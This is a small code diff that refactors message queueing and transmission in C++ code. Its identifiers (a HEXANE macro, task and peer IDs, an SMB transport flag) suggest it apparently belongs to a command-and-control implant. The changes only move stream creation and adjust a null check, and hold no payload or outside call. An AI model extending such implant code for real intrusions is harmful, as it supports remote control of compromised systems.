@@ -89,8 +89,8 @@ namespace Message {
 
         } else {
             Parser::CreateParser(&Parser, B_PTR(Outbound->Buffer), Outbound->Length);
-            Queue = Stream::CreateStream();
 
+            Queue           = Stream::CreateStream();
             Queue->PeerId   = Parser::UnpackDword(&Parser);
             Queue->TaskId   = Parser::UnpackDword(&Parser);
             Queue->MsgType  = Parser::UnpackDword(&Parser);
@@ -146,13 +146,13 @@ namespace Message {
     VOID MessageTransmit() {
         HEXANE
 
-        PARSER Parser       = { };
-        PSTREAM Outbound    = { };
+        PSTREAM Outbound    = Stream::CreateStream();
         PSTREAM Inbound     = { };
         PSTREAM Head        = { };
         PSTREAM Swap        = { };
+        PARSER Parser       = { };
 
-        if (!Ctx->Transport.OutboundQueue->Buffer) {
+        if (!Ctx->Transport.OutboundQueue) {
 #ifdef TRANSPORT_SMB
             return_defer(ERROR_SUCCESS);
 #endif
@@ -161,8 +161,6 @@ namespace Message {
             Stream::PackDword(Outbound, TypeTasking);
 
         } else {
-
-            Outbound = Stream::CreateStream();
             Head = Ctx->Transport.OutboundQueue;
 
             while (Head) {
